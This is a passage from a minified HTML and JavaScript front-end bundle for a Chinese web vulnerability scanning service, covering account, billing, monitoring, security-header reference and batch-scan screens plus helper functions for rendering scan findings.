        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="toggleAuthForm('login')">返回登录</button>

        </div>

        <div class="auth-form-switch">

          <a onclick="toggleAuthForm('login')">返回登录</a>

        </div>

      </div>

    </div>



    <!-- 注册表单 -->

    <div id="auth-register" style="display:none">

      <div class="card auth-form">

        <h3>注册新账号</h3>

        <div class="auth-form-error" id="register-error"></div>

        <div class="auth-form-row">

          <input type="text" id="reg-username" placeholder="用户名" aria-label="用户名" />

        </div>

        <div class="auth-form-row">

          <input type="text" id="reg-email" placeholder="邮箱（可选）" aria-label="邮箱" />

        </div>

        <div class="auth-form-row">

          <input type="password" id="reg-password" placeholder="密码" aria-label="密码" />

        </div>

        <div class="auth-form-row">

          <input type="password" id="reg-password2" placeholder="确认密码" aria-label="确认密码" />

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="doResendVerification()">重新发送验证邮件</button>

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn" style="flex:1" onclick="doRegister()">注 册</button>

        </div>

        <div class="auth-form-row">

          <input type="text" id="verify-email-token" placeholder="邮箱验证 token（收到邮件后填写）" aria-label="邮箱验证 token" />

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="doVerifyEmailFromToken()">验证邮箱</button>

        </div>

        <div class="auth-form-switch">

          已有账号？<a onclick="toggleAuthForm('login')">去登录</a>

        </div>

      </div>

    </div>



    <!-- 已登录：显示用户信息 -->

    <div id="auth-logged" style="display:none">

      <div class="settings-user-row">

        <div>

          <div class="user-name" id="auth-display-name">用户</div>

          <div class="user-label" id="auth-user-role">已登录</div>

          <div class="user-credits" id="user-credits" style="font-size:12px;color:var(--warning);margin-top:4px">额度：--</div>

        </div>

        <button class="auth-logout-btn" onclick="doLogout()">退出登录</button>

      </div>

    </div>

  </div>



  <!-- 账号统计 -->

  <div class="settings-group">

    <div class="settings-row-static">

      <div style="text-align:center;flex:1">

        <div class="num" id="stat-scan-count" style="color:var(--primary);font-size:18px;font-weight:700">0</div>

        <div style="font-size:11px;color:var(--text-secondary);margin-top:2px">扫描次数</div>

      </div>

      <div style="text-align:center;flex:1;border-left:1px solid var(--border-light);border-right:1px solid var(--border-light)">

        <div class="num" id="stat-avg-score" style="color:var(--success);font-size:18px;font-weight:700">-</div>

        <div style="font-size:11px;color:var(--text-secondary);margin-top:2px">平均评分</div>

      </div>

      <div style="text-align:center;flex:1">

        <div class="num" id="stat-fixed-count" style="color:var(--warning);font-size:18px;font-weight:700">0</div>

        <div style="font-size:11px;color:var(--text-secondary);margin-top:2px">已修复</div>

      </div>

    </div>

  </div>



  <!-- 设置菜单 -->

  <div class="settings-group">

    <div class="settings-row" onclick="showProfileTab('history')">

      <span>扫描历史</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('knowledge')">

      <span>安全知识库</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('monitor')">

      <span>监控目标</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('alerts')">

      <span>告警历史</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('credits')">

      <span>额度与使用记录</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="navigateTo('assets')">

      <span>资产管理</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="navigateTo('billing')">

      <span>购买积分套餐</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('settings')">

      <span>扫描设置</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('notifications')">

      <span>通知设置</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('ai-config')">

      <span>安全顾问配置</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('about')">

      <span>关于</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

  </div>



  <!-- API Token -->

  <div class="settings-group">

    <div class="settings-group-title">API Token</div>

    <div class="settings-row-static">

      <input type="text" id="api-token-input" readonly value="登录后显示 Token" style="flex:1;background:#2b2b2b;color:var(--text-secondary);font-family:monospace;font-size:11px" />

      <button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px" onclick="copyApiToken()">复制</button>

    </div>

    <p style="font-size:11px;color:var(--text-secondary);margin-top:6px">此 Token 用于 API 调用身份认证，登录后自动生成。Token 会在服务端密钥变更或过期后失效。</p>

  </div>



  <!-- 扫描历史面板 -->

  <div id="profile-tab-history" class="profile-tab" style="display:none">

    <div class="card">

      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">

        <div class="card-title">扫描历史</div>

        <button class="fixer-btn secondary" style="height:36px;padding:0 14px;font-size:12px" onclick="clearScanHistory()">清空历史</button>

      </div>

      <!-- 风险趋势 -->

      <div id="history-trend-wrap" style="margin-bottom:16px;display:none">

        <div style="font-size:13px;font-weight:600;margin-bottom:8px">最近 5 次风险趋势</div>

        <div id="history-trend-chart" style="height:60px"></div>

      </div>

      <!-- 对比模式工具栏 -->

      <div id="history-compare-bar" style="display:none;align-items:center;gap:8px;margin-bottom:12px;padding:10px;background:var(--bg);border-radius:2px;border:1px solid var(--border)">

        <span style="font-size:12px;color:var(--text-secondary)">已选择 <strong id="history-compare-count">0</strong> 项</span>

        <button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px;margin-left:auto" onclick="cancelHistoryCompare()">取消</button>

        <button class="fixer-btn primary" style="height:32px;padding:0 12px;font-size:12px" id="history-compare-btn" onclick="doHistoryCompare()" disabled>对比</button>

      </div>

      <div id="scan-history-list"></div>

      <div id="history-pagination" class="pagination-bar" style="display:none"></div>

    </div>

  </div>



  <!-- 安全知识库面板 -->

  <div id="profile-tab-knowledge" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">安全响应头速查</div>

      <div class="finding-section" style="margin-top:10px">

        <h4>Strict-Transport-Security (HSTS)</h4>

        <p>强制浏览器使用 HTTPS，防止 SSL 剥离攻击。</p>

        <div class="code-block" style="margin-top:6px">add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;</div>

      </div>

      <div class="finding-section">

        <h4>Content-Security-Policy (CSP)</h4>

        <p>限制页面可加载的资源来源，防止 XSS 攻击。</p>

        <div class="code-block" style="margin-top:6px">add_header Content-Security-Policy "default-src 'self'; script-src 'self'; frame-ancestors 'none'" always;</div>

      </div>

      <div class="finding-section">

        <h4>X-Frame-Options</h4>

        <p>防止网站被嵌入到恶意 iframe 中（点击劫持）。</p>

        <div class="code-block" style="margin-top:6px">add_header X-Frame-Options "DENY" always;</div>

      </div>

      <div class="finding-section">

        <h4>X-Content-Type-Options</h4>

        <p>禁止浏览器进行 MIME 类型嗅探。</p>

        <div class="code-block" style="margin-top:6px">add_header X-Content-Type-Options "nosniff" always;</div>

      </div>

    </div>

  </div>



  <!-- 监控目标面板 -->

  <div id="profile-tab-monitor" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">监控目标管理</div>

      <p class="card-desc" style="margin-bottom:14px">添加需要定期扫描的网站 URL，系统将按设定频率自动扫描。</p>

      <div class="monitor-add-row">

        <input type="url" id="monitor-url-input" placeholder="输入 URL，例如 https://example.com" />

        <select id="monitor-freq-select">

          <option value="daily">每天</option>

          <option value="weekly">每周</option>

          <option value="none">不扫描</option>

        </select>

        <button class="monitor-add-btn" onclick="addMonitorTarget()"> 添加</button>

      </div>

      <div id="monitor-target-list"></div>

    </div>

  </div>



  <!-- 告警历史面板 -->

  <div id="profile-tab-alerts" class="profile-tab" style="display:none">

    <div class="card">

      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">

        <div class="card-title">告警历史</div>

        <button class="fixer-btn secondary" style="height:36px;padding:0 14px;font-size:12px" onclick="markAllAlertsRead()">全部已读</button>

      </div>

      <div id="alerts-list" style="min-height:60px"></div>

      <div id="alerts-pagination" class="pagination-bar" style="display:none"></div>

    </div>

  </div>



  <!-- 设置面板 -->

  <div id="profile-tab-settings" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">扫描设置</div>

      <div class="settings-row" style="margin-top:10px" onclick="toggleSetting(this, 'autoSave')">

        <span>自动保存扫描结果</span>

        <span class="settings-toggle on" id="setting-autoSave" data-enabled="true"></span>

      </div>

      <div class="settings-row" onclick="toggleSetting(this, 'darkMode')">

        <span>深色模式</span>

        <span class="settings-toggle" id="setting-darkMode" data-enabled="false"></span>

      </div>

      <div class="settings-row" onclick="toggleSetting(this, 'notify')">

        <span>扫描完成提醒</span>

        <span class="settings-toggle on" id="setting-notify" data-enabled="true"></span>

      </div>

    </div>

  </div>



  <!-- 通知设置面板 -->

  <div id="profile-tab-notifications" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">通知设置</div>

      <p class="card-desc" style="margin-bottom:14px">配置告警通知方式，支持邮件和 Webhook（钉钉/企业微信/飞书）。</p>

      <div style="margin-bottom:12px">

        <label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">通知邮箱</label>

        <input type="email" id="notify-email-input" placeholder="your@email.com" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)" />

      </div>

      <div style="margin-bottom:12px">

        <label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">Webhook 地址</label>

        <input type="url" id="notify-webhook-input" placeholder="https://oapi.dingtalk.com/robot/send?access_token=xxx" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)" />

        <p style="font-size:12px;color:var(--text-secondary);margin-top:4px">支持钉钉、企业微信、飞书等 Markdown Webhook</p>

      </div>

      <div style="margin-bottom:16px">

        <label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">告警阈值</label>

        <select id="notify-threshold-select" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)">

          <option value="critical">仅严重 (Critical)</option>

          <option value="high">高危及以上 (High+)</option>

          <option value="medium">中危及以上 (Medium+)</option>

          <option value="low">低危及以上 (Low+)</option>

          <option value="all">全部通知</option>

        </select>

      </div>

      <button class="fixer-btn primary" style="width:100%" onclick="saveNotificationSettings()">保存设置</button>

    </div>

  </div>



  <!-- 额度与使用记录面板 -->

  <div id="profile-tab-credits" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">额度与使用记录</div>

      <div style="display:flex;align-items:center;gap:12px;margin:14px 0;padding:14px;background:var(--bg);border:1px solid var(--border);border-radius:2px">

        <div>

          <div style="font-size:12px;color:var(--text-secondary)">当前额度</div>

          <div id="credits-balance" style="font-size:24px;font-weight:700;color:var(--warning)">--</div>

        </div>

        <button class="fixer-btn secondary" style="margin-left:auto;height:32px;padding:0 14px;font-size:12px" onclick="loadCreditsUsage()">刷新</button>

      </div>

      <div id="credits-usage-list" style="min-height:60px">

        <div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取使用记录...</div>

      </div>

      <div id="credits-pagination" class="pagination-bar" style="display:none"></div>

    </div>

  </div>



  <!-- 安全顾问配置面板 -->

  <div id="profile-tab-ai-config" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">安全顾问配置</div>

      <div style="margin-top:14px">

        <label style="display:block;font-size:13px;color:var(--text-secondary);margin-bottom:6px">API Key</label>

        <div style="display:flex;gap:8px">

          <input id="ai-config-apikey" type="password" placeholder="sk-..." style="flex:1;padding:10px 12px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)" />

          <button onclick="toggleApiKeyVisibility()" id="ai-config-eye" style="background:var(--bg-secondary);border:1px solid var(--border);border-radius:2px;padding:0 12px;cursor:pointer;font-size:13px;color:var(--text-secondary)">显示</button>

        </div>

        <div style="font-size:11px;color:var(--text-lighter);margin-top:4px">API Key 仅保存在浏览器本地，不会上传到服务器。</div>

      </div>

      <div style="margin-top:14px">

        <label style="display:block;font-size:13px;color:var(--text-secondary);margin-bottom:6px">模型提供商</label>

        <select id="ai-config-provider" style="width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)">

          <option value="openai">OpenAI (GPT-4)</option>

        </select>

      </div>

      <div style="margin-top:14px">

        <label style="display:block;font-size:13px;color:var(--text-secondary);margin-bottom:6px">模型名称</label>

        <input id="ai-config-model" type="text" placeholder="gpt-4o-mini" style="width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)" />

      </div>

      <div class="settings-row" style="margin-top:14px" onclick="toggleAISetting('useLLM')">

        <span>启用 LLM（优先调用真实大模型）</span>

        <span class="settings-toggle on" id="setting-useLLM" data-enabled="true"></span>

      </div>

      <div style="margin-top:14px;display:flex;gap:8px">

        <button onclick="saveAIConfig()" style="flex:1;background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:10px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:500">保存配置</button>

        <button onclick="clearAIConfig()" style="flex:1;background:var(--bg);color:var(--text);border:1px solid var(--border);padding:10px;border-radius:2px;cursor:pointer;font-size:13px">清除配置</button>

      </div>

    </div>

  </div>



  <!-- 关于面板 -->

  <div id="profile-tab-about" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">关于</div>

      <div style="text-align:left;font-size:13px;color:var(--text-secondary);line-height:2">

        <p>基于 OWASP Top 10 安全标准</p>

        <p>域名归属验证，确保授权扫描</p>

        <p>智能检查，生成多平台修复配置</p>

        <p>账号级数据隔离</p>

        <p>支持 Nginx / Apache / Node.js</p>

      </div>

      <div style="margin-top:16px;padding-top:16px;border-top:1px solid var(--border-light)">

        <p style="font-size:12px;color:var(--text-lighter)">开源项目 | MIT License</p>

        <p style="font-size:12px;color:var(--text-lighter);margin-top:4px">反馈: vuln-sentinel@example.com</p>

      </div>

    </div>

  </div>

</div>



<!-- 计费套餐页面 -->

<div class="page" id="page-billing">

  <div class="workbench-header">

    <h1 class="workbench-title">计费套餐 / Billing</h1>

    <span class="workbench-subtitle">购买积分套餐，按量使用扫描与修复服务</span>

  </div>



  <div class="card" style="margin-bottom:16px">

    <div class="card-title">选择套餐</div>

    <p class="card-desc" style="margin-bottom:14px">积分用于扫描、修复验证等操作，购买后即时到账。</p>

    <div id="billing-plans-list" style="min-height:80px">

      <div style="text-align:center;padding:20px;color:var(--text-secondary)">正在加载套餐...</div>

    </div>

  </div>



  <div class="card">

    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">

      <div class="card-title">充值记录</div>

      <button class="fixer-btn secondary" style="height:32px;padding:0 14px;font-size:12px" onclick="loadBillingPage()">刷新</button>

    </div>

    <div id="billing-records-list" style="min-height:60px">

      <div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取充值记录...</div>

    </div>

    <div id="billing-records-pagination" class="pagination-bar" style="display:none"></div>

  </div>

</div>



<div class="page" id="page-audit">

  <div class="workbench-header">

    <h1 class="workbench-title">上线前审计 / Audit</h1>

    <span class="workbench-subtitle">用于对外交付前的内部检查：权限、证据、计费、导出、复扫与审计留痕</span>

  </div>



  <div class="card" style="margin-bottom:16px">

    <div class="card-title">客户闭环</div>

    <p class="card-desc" style="margin-bottom:14px">客户输入网址后，系统应该稳定完成扫描、证据展示、工单、修复、复测和报告导出。</p>

    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px">

      <div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><strong>1. 扫描入口</strong><div style="font-size:12px;color:var(--text-secondary);margin-top:4px">检查登录、授权、额度和目标地址是否能顺利进入扫描。</div></div>

      <div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><strong>2. 证据展示</strong><div style="font-size:12px;color:var(--text-secondary);margin-top:4px">检查请求、响应、命中签名、摘要和可信度是否清晰。</div></div>

      <div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><strong>3. 工单修复</strong><div style="font-size:12px;color:var(--text-secondary);margin-top:4px">检查工单、修复器、复测和报告是否形成闭环。</div></div>

      <div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><strong>4. 商业化</strong><div style="font-size:12px;color:var(--text-secondary);margin-top:4px">检查套餐、额度、支付回调、导出权限和审计留痕。</div></div>

    </div>

  </div>



  <div class="card">

    <div class="card-title">上线前检查清单</div>

    <div style="margin-top:12px;display:grid;gap:10px;font-size:13px;line-height:1.7;color:var(--text-secondary)">

      <div>☐ 登录 / 注册 / 退出是否稳定</div>

      <div>☐ 输入网址后能否顺利开始扫描</div>

      <div>☐ 额度不足是否能明确提示并引导充值</div>

      <div>☐ 扫描结果是否区分“已验证 / 可能存在 / 存疑”</div>

      <div>☐ 工单是否能发起、流转、复测并关闭</div>

      <div>☐ 修复报告和扫描报告是否便于交付客户</div>

      <div>☐ 支付回调、积分扣减、导出权限是否有日志</div>

      <div>☐ 结果页和套餐页是否有适合客户看的说明</div>

    </div>

  </div>

</div>



<!-- Batch Scan Modal -->

<div class="modal" id="batch-scan-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:1000;align-items:center;justify-content:center">

  <div class="modal-content" style="background:var(--card);border:1px solid var(--border);border-radius:2px;padding:20px;max-width:520px;width:92vw;max-height:85vh;overflow-y:auto">

    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">

      <h3 style="margin:0;font-size:16px">批量扫描</h3>

      <button onclick="closeBatchScanModal()" aria-label="关闭批量扫描" style="background:none;border:none;font-size:20px;cursor:pointer;color:var(--text-secondary)">×</button>

    </div>

    <div style="font-size:12px;color:var(--text-secondary);margin-bottom:8px">每行一个 URL，最多 5 个。建议先用快速模式扫描公开演示站点：</div>

    <textarea id="batch-urls" placeholder="https://example.com&#10;https://httpbin.org&#10;https://www.iana.org" style="width:100%;min-height:120px;padding:10px;border:1px solid var(--border);border-radius:2px;font-family:monospace;font-size:12px;background:var(--bg);color:var(--text);resize:vertical"></textarea>

    <div style="margin:10px 0;display:flex;align-items:center;gap:6px;font-size:12px">

      <input type="checkbox" id="batch-deep" style="cursor:pointer" />

      <label for="batch-deep" style="cursor:pointer;color:var(--text-secondary)">深度扫描（含 XSS/SQLi 注入测试）</label>

    </div>

    <label class="scan-checkbox" style="margin-bottom:10px">

      <input id="batch-auth-check" type="checkbox" onchange="document.getElementById('batch-go-btn').disabled=!this.checked" />

      <span>我已确认拥有上述域名或已获得授权扫描</span>

    </label>

    <div id="batch-results" style="margin-top:12px"></div>

    <div style="display:flex;gap:8px;margin-top:14px">

      <button onclick="closeBatchScanModal()" style="flex:1;background:var(--bg);color:var(--text);border:1px solid var(--border);padding:10px;border-radius:2px;cursor:pointer">关闭</button>

      <button onclick="doBatchScan()" id="batch-go-btn" disabled style="flex:1;background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:10px;border-radius:2px;cursor:pointer;font-weight:500">开始批量扫描</button>

    </div>

  </div>

</div>



<nav class="bottom-nav">

  <button class="nav-item active" data-page="home" onclick="navigateTo('home')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>

    <span>首页</span>

  </button>

  <button class="nav-item" data-page="scan" onclick="navigateTo('scan')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>

    <span>扫描</span>

  </button>

  <button class="nav-item" data-page="fixer" onclick="navigateTo('fixer')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>

    <span>修复器</span>

  </button>

  <button class="nav-item" data-page="tickets" onclick="navigateTo('tickets')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg>

    <span>工单</span>

  </button>

  <button class="nav-item" data-page="billing" onclick="navigateTo('billing')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>

    <span>计费</span>

  </button>

  <button class="nav-item" data-page="audit" onclick="navigateTo('audit')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l7 4v6c0 5-3.8 9.7-7 10-3.2-.3-7-5-7-10V6l7-4z"/><path d="M9 12l2 2 4-4"/></svg>

    <span>审计</span>

  </button>

  <button class="nav-item" data-page="profile" onclick="navigateTo('profile')">

    <div style="position:relative">

      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>

      <span id="nav-alert-badge" style="display:none;position:absolute;top:-4px;right:-6px;background:var(--danger);color:#fff;font-size:10px;font-weight:700;padding:1px 5px;border-radius:2px;min-width:16px;text-align:center">0</span>

    </div>

    <span>我的</span>

  </button>

</nav>



<!-- 右上角主题切换按钮 -->

<button class="theme-fab" id="theme-fab" onclick="toggleThemeQuick()" aria-label="切换明暗主题" title="切换主题">

  <svg id="theme-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:20px;height:20px">

    <circle cx="12" cy="12" r="5"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/>

  </svg>

</button>

`;function Ye(e){return document.getElementById(e)||null}function rt(e,i){let t=Ye(e);t&&(t.textContent=i)}function ji(e,i){let t=Ye(e);t&&(t.innerHTML=i)}function He(e,i){let t=Ye(e);t&&(t.style.display=i)}function E(e){if(e==null)return"";let i=document.createElement("div");return i.appendChild(document.createTextNode(String(e))),i.innerHTML}function be(e){return String(e??"").replace(/'/g,"&#39;").replace(/"/g,"&quot;")}function Qe(e){try{return/^https?:\/\//i.test(e)||(e="http://"+e),new URL(e).hostname}catch{return e.replace(/^https?:\/\//i,"").split("/")[0]}}function Pt(e){return e=parseInt(e,10),isNaN(e)&&(e=0),e>=75?"#73c990":e>=50?"#f0a732":"#c75450"}function Lt(e){return e=parseInt(e,10),isNaN(e)&&(e=0),e=Math.max(0,Math.min(100,e)),e>=75?"conic-gradient(#73c990 0% "+e+"%, #334155 "+e+"% 100%)":e>=50?"conic-gradient(#f0a732 0% "+e+"%, #334155 "+e+"% 100%)":"conic-gradient(#c75450 0% "+e+"%, #334155 "+e+"% 100%)"}function Hi(e){return e==="严重"||e==="critical"||e==="高风险"||e==="high"?"high":e==="中风险"||e==="medium"?"medium":"low"}function ht(e){return navigator.clipboard&&navigator.clipboard.writeText?navigator.clipboard.writeText(e):new Promise((i,t)=>{try{let r=document.createElement("textarea");r.value=e,r.style.position="fixed",r.style.left="-9999px",document.body.appendChild(r),r.select(),document.execCommand("copy"),document.body.removeChild(r),i()}catch(r){t(r)}})}function Nt(e){if(!e)return"-";try{const i=new Date(e);if(isNaN(i.getTime()))return e;const t=r=>String(r).padStart(2,"0");return`${i.getFullYear()}-${t(i.getMonth()+1)}-${t(i.getDate())} ${t(i.getHours())}:${t(i.getMinutes())}`}catch{return e}}function Ne(e){if(!e)return"未知错误";let i="";return typeof e.error=="string"&&e.error?i=e.error:typeof e.detail=="string"&&e.detail?i=e.detail:Array.isArray(e.detail)&&e.detail.length>0?i=e.detail.map(function(t){return t?typeof t=="string"?t:typeof t.msg=="string"&&t.msg?t.msg:Array.isArray(t.loc)&&t.loc.length?String(t.loc[t.loc.length-1]):"":""}).filter(Boolean).join("；"):typeof e.message=="string"&&e.message?i=e.message:i="请求失败",typeof e.code=="string"&&!i.includes(e.code)&&e.code!=="ERROR"&&(i+="（"+e.code+"）"),e.restricted_code==="restricted"?i+="（该目标类型受限，请确认您拥有合法授权后再扫描）":e.restricted_code==="ownership_required"?i+="，请先完成域名归属验证。":e.restricted_code==="unauthorized"&&(i+="（请先确认您有权扫描该目标）"),i}function Dt(e){return e&&e._status===402&&e.code==="PAYMENT_REQUIRED"}function Rt(e){return Dt(e)?typeof e.message=="string"&&e.message||"额度不足，请充值后再试":""}function Qt(e){let i=e&&(e.message||e.error||e.detail)||String(e)||"未知错误";return/timeout|timed out/i.test(i)?"请求超时，请检查网络连接或稍后重试":/network|fetch|internet|offline/i.test(i)?"网络连接异常，请检查网络设置":/403|forbidden/i.test(i)?"请求被拒绝，请检查权限或联系管理员":/404|not found/i.test(i)?"请求的资源不存在":/500|502|503|504|server error/i.test(i)?"服务器暂时不可用，请稍后重试":/unauthorized|401|未登录|登录|token|jwt/i.test(i)?"登录状态已过期，请重新登录":i}function ge(e,i){let t=Ye(e);t&&(i?(t._originalText=t.textContent,t.textContent="处理中...",t.disabled=!0):(t.textContent=t._originalText||t.textContent,t.disabled=!1))}function oi(e,i,t,r){let s=Ye(e);if(!s)return;if(t<=1){s.innerHTML="";return}let o="",a=5,n=Math.max(1,i-Math.floor(a/2)),c=Math.min(t,n+a-1);c-n<a-1&&(n=Math.max(1,c-a+1)),i>1&&(o+='<button class="page-btn" data-page="'+(i-1)+'">上一页</button>');for(let g=n;g<=c;g++)o+='<button class="page-btn '+(g===i?"active":"")+'" data-page="'+g+'">'+g+"</button>";i<t&&(o+='<button class="page-btn" data-page="'+(i+1)+'">下一页</button>'),s.innerHTML=o,s.querySelectorAll(".page-btn").forEach(function(g){g.addEventListener("click",function(){let v=parseInt(this.dataset.page,10);r&&r(v)})})}var Mn={header:"相关响应头",detected:"检测结果",reason:"判断依据",impact:"影响说明",value:"当前值",check_scope:"检测范围",limitation:"检测局限",param:"问题参数",payload:"测试 Payload",url:"问题 URL",path:"暴露路径",status:"响应状态",snippet:"内容片段",library:"组件名称",version:"当前版本",detected_version:"当前版本",min_safe_version:"安全版本",cve:"关联 CVE",missing_flags:"缺失安全标志",redirect_to:"重定向目标",os:"操作系统",body_hint:"响应特征",days_left:"证书剩余天数",method:"检测方法"},Pn=["detected","header","reason","impact","value","check_scope","limitation","param","payload","url","path","status","snippet","library","version","detected_version","min_safe_version","cve","missing_flags","redirect_to","os","body_hint","days_left","method"];function Ei(e){if(!e||typeof e!="object")return"";let i=Object.keys(e).filter(function(s){return e[s]!==void 0&&e[s]!==null&&e[s]!==""});if(i.length===0)return"";let t=[];return Pn.forEach(function(s){i.indexOf(s)>=0&&t.push(s)}),i.forEach(function(s){t.indexOf(s)<0&&t.push(s)}),'<div style="margin-top:10px">'+t.map(function(s){let o=Mn[s]||s,a=e[s],n="";if(s==="detected"){let c=a?"#c75450":"#73c990",g=a?"已检测到":"未检测到";n='<span style="color:'+c+';font-weight:600;font-size:12px">'+g+"</span>"}else if(s==="payload")n='<code style="background:#3b0d0d;color:#fecaca;padding:2px 8px;border-radius:2px;font-size:12px;word-break:break-all;border:1px solid rgba(199,84,80,0.35)">'+E(a)+"</code>";else if(s==="url"||s==="path")n='<code style="background:#2b2b2b;padding:2px 8px;border-radius:2px;font-size:12px;word-break:break-all">'+E(a)+"</code>";else if(s==="cve"){let c=String(a),g=c.match(/CVE-\d{4}-\d{4,7}/gi)||[];if(g.length>0){n=g.map(function(d){return'<span style="display:inline-block;background:#c75450;color:#fff;padding:2px 8px;border-radius:2px;font-size:11px;font-weight:700;letter-spacing:0.3px">'+E(d)+"</span>"}).join(" ");let v=c.replace(/CVE-\d{4}-\d{4,7}/gi,"").replace(/[,\s、，；;]+/g," ").trim();v&&(n+=' <span style="font-size:12px;color:var(--text-secondary)">'+E(v)+"</span>")}else n='<span style="display:inline-block;background:#c75450;color:#fff;padding:2px 8px;border-radius:2px;font-size:11px;font-weight:700">'+E(c)+"</span>"}else s==="missing_flags"?n=(Array.isArray(a)?a:[a]).map(function(g){return'<code style="background:rgba(240,167,50,0.1);color:#f0a732;padding:2px 8px;border-radius:2px;font-size:12px">'+E(g)+"</code>"}).join(" "):s==="status"||s==="days_left"?n='<span style="font-weight:600;color:var(--text-primary);font-size:12px">'+E(a)+"</span>":s==="snippet"?n='<code style="background:#1e293b;color:#e2e8f0;padding:6px 8px;border-radius:2px;font-size:11px;word-break:break-all;display:block;white-space:pre-wrap;max-height:160px;overflow:auto">'+E(a)+"</code>":n='<span style="font-size:12px;color:var(--text)">'+E(a)+"</span>";return'<div style="margin-bottom:8px"><span style="display:inline-block;min-width:80px;color:var(--text-secondary);font-size:12px;font-weight:600">'+o+"</span> "+n+"</div>"}).join("")+"</div>"}let ei=[],kt=0;const Rn=3,Fn=2500;function 